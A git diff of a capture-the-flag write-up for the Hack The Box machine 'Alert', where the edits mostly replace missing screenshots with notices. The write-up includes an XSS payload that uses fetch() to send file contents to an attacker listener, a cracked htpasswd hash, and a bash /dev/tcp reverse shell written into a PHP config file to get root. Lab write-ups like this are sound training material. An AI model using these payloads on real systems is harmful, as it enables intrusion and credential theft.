@@ -1,4 +1,11 @@
-[screenshot][screenshot]# Alert
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/030ff9e0-bef1-4519-ac5c-1b697f91c49f) returned 404 during the image audit (2026-10-08).
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/4a261af5-e03e-4ac9-a1b7-a716623f9918) returned 404 during the image audit (2026-10-08).
+
+# Alert
 OS: Linux\
 Difficulty: Easy
 
@@ -6,8 +13,8 @@ Difficulty: Easy
 ### Recon
 I first check UDP because that messed me up in the past:
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-0xppy3gxfc][~]
- []$ nmap -T5 -sV -p- -sU --open --min-rate=1500 -Pn alert.htb 
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-0xppy3gxfc]─[~]
+└──╼ [★]$ nmap -T5 -sV -p- -sU --open --min-rate=1500 -Pn alert.htb 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 20:23 CST
 Warning: 10.10.11.44 giving up on port because retransmission cap hit (2).
 Nmap scan report for alert.htb (10.10.11.44)
@@ -19,8 +26,8 @@ Nmap done: 1 IP address (1 host up) scanned in 904.17 seconds
 Nothing.\
 A regular scan next:
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-0xppy3gxfc][~]
- []$ nmap -T5 -sV -p- --open --min-rate=1500 -Pn alert.htb 
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-0xppy3gxfc]─[~]
+└──╼ [★]$ nmap -T5 -sV -p- --open --min-rate=1500 -Pn alert.htb 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 20:40 CST
 Nmap scan report for alert.htb (10.10.11.44)
 Host is up (0.0093s latency).
@@ -35,7 +42,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
 ```
 Fantastic, we have a web page up:\
-[screenshot]\
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/a8e12dcb-df03-4178-98c6-3726b54e16cd) returned 404 during the image audit (2026-10-08).
+
+
 It appears to be some kind of markdown viewer site where we can upload files.
 
 Inside the *About Us* section:\
@@ -48,8 +59,8 @@ Thank you for using our service!
 
 #### Enumeration
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
- []$ gobuster dir -u http://alert.htb -w /usr/share/wordlists/dirb/common.txt
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lllpmxst8e]─[~]
+└──╼ [★]$ gobuster dir -u http://alert.htb -w /usr/share/wordlists/dirb/common.txt
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -80,8 +91,8 @@ Finished
 
 #### Vuln Hunting
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
- []$ nuclei -u http://alert.htb
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lllpmxst8e]─[~]
+└──╼ [★]$ nuclei -u http://alert.htb
 
                      __     _
    ____  __  _______/ /__  (_)
@@ -123,7 +134,11 @@ Let us see what this one looks like when we attempt a normal upload:
 # Test Markdown
 Hello, World!
 ```
-[screenshot]\
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/f9a1dcfe-ec51-4e10-b7b1-5fd34c06df84) returned 404 during the image audit (2026-10-08).
+
+
 Now to test with Burp:
 ```HTTP
 POST /visualizer.php HTTP/1.1
@@ -206,7 +221,11 @@ What resulted was the lack of security headers, meaning we can do some *cross-si
 ```HTML
 <script>alert('XSS')</script>
 ```
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/6550ec60-d83e-4dfa-8da5-2da78b1d8631) returned 404 during the image audit (2026-10-08).
+
+
 > It worked!
 >> Time to try more.
 
@@ -219,14 +238,14 @@ What resulted was the lack of security headers, meaning we can do some *cross-si
 nc -lvnp 8080
 ```
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
- []$ cat toast.md 
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lllpmxst8e]─[~]
+└──╼ [★]$ cat toast.md 
 <script>alert('XSS')</script>
 ```
 > Result:
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
- []$ nc -lvnp 8080
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lllpmxst8e]─[~]
+└──╼ [★]$ nc -lvnp 8080
 listening on [any] 8080 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.10.14.3] 45500
 GET /?cookie= HTTP/1.1
@@ -257,8 +276,8 @@ Trying with Web-Socket now:
 ```
 ```
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
- []$ nc -lvnp 1117
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lllpmxst8e]─[~]
+└──╼ [★]$ nc -lvnp 1117
 listening on [any] 1117 ...
 connect to [10.10.14.3] from (UNKNOWN) [10.10.14.3] 41534
 GET / HTTP/1.1
@@ -322,8 +341,8 @@ and then use this:
 ```
 Huzzah!
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
- []$ python3 websocket_server.py 
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lllpmxst8e]─[~]
+└──╼ [★]$ python3 websocket_server.py 
 [+] WebSocket server listening on port 1117
 [+] Connection established
 Shell> 
@@ -331,8 +350,8 @@ Shell>
 
 > It sort of froze up and broke...
 ```Bash
-[us-vip-3][10.10.14.3][gntsqid@htb-lllpmxst8e][~]
- []$ python3 websocket_server.py 
+┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lllpmxst8e]─[~]
+└──╼ [★]$ python3 websocket_server.py 
 [+] WebSocket server listening on port 1117
 [+] Connection established
 Shell> whoami
@@ -444,14 +463,16 @@ fetch("http://10.10.14.28:1337/?file_content=" + encodeURIComponent(data));
 </script>
 ```
 Upload, then share link, and finally paste link in Contact Us page!\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/74d2cd05-7d03-4bbd-974b-76acdc83841e) returned 404 during the image audit (2026-10-08).
 
 
 ### Post-Exploit
 ~~We officially have a working shell.~~
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
- []$ python3 -m http.server 1337
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-tnbwsejwe9]─[~]
+└──╼ [★]$ python3 -m http.server 1337
 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 10.10.14.28 - - [13/Jan/2025 13:46:14] "GET /?file_content=%0A HTTP/1.1" 200 -
 10.10.14.28 - - [13/Jan/2025 13:46:16] "GET /?file_content=%0A HTTP/1.1" 200 -
@@ -464,14 +485,14 @@ albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
 
 #### User Hash
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
- []$ hashcat --identify hash
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-tnbwsejwe9]─[~]
+└──╼ [★]$ hashcat --identify hash
 No hash-mode matches the structure of the input hash.
 ```
 After removing the username (*thanks Juan!*):
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
- []$ hashcat --identify hash
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-tnbwsejwe9]─[~]
+└──╼ [★]$ hashcat --identify hash
 The following hash-mode match the structure of your input hash:
 
       # | Name                                                       | Category
@@ -523,8 +544,13 @@ ssh -L 1337:127.0.0.1:8080 albert@alert.htb
 albert@alert:~$ ls /var/www
 alert.htb  html  statistics.alert.htb
 ```
-[screenshot]\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/afa2393d-186f-4c90-a8f6-190d712617de) returned 404 during the image audit (2026-10-08).
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/ae567df5-14da-41df-a28b-80585c677085) returned 404 during the image audit (2026-10-08).
+
 
 ```Bash
 albert@alert:~$ cat /etc/passwd
@@ -588,8 +614,8 @@ Change: 2025-01-14 00:08:54.621302315 +0000
 
 ### Root
 ```Bash
-[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
- []$ ssh -L 1337:127.0.0.1:8080 albert@alert.htb
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-tnbwsejwe9]─[~]
+└──╼ [★]$ ssh -L 1337:127.0.0.1:8080 albert@alert.htb
 ```
 ```Bash
 albert@alert:~$ cat /opt/website-monitor/config/configuration.php 
@@ -598,11 +624,14 @@ define('PATH', '/opt/website-monitor');
 exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.28/1339 0>&1'");
 ?>
 ```
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/864cddd8-23f1-466d-95bc-a616a90d337b) returned 404 during the image audit (2026-10-08).
+
 
 ```bash
-[us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
- []$ nc -lvnp 1339
+┌─[us-vip-2]─[10.10.14.28]─[gntsqid@htb-tnbwsejwe9]─[~]
+└──╼ [★]$ nc -lvnp 1339
 listening on [any] 1339 ...
 connect to [10.10.14.28] from (UNKNOWN) [10.10.11.44] 46932
 id
@@ -611,11 +640,5 @@ cat /root/root.txt
 88cfdae679ef6a85e6abad34e6e2e43d
 ```
 > **88cfdae679ef6a85e6abad34e6e2e43d**
-
-
-
-
-
-
 
 
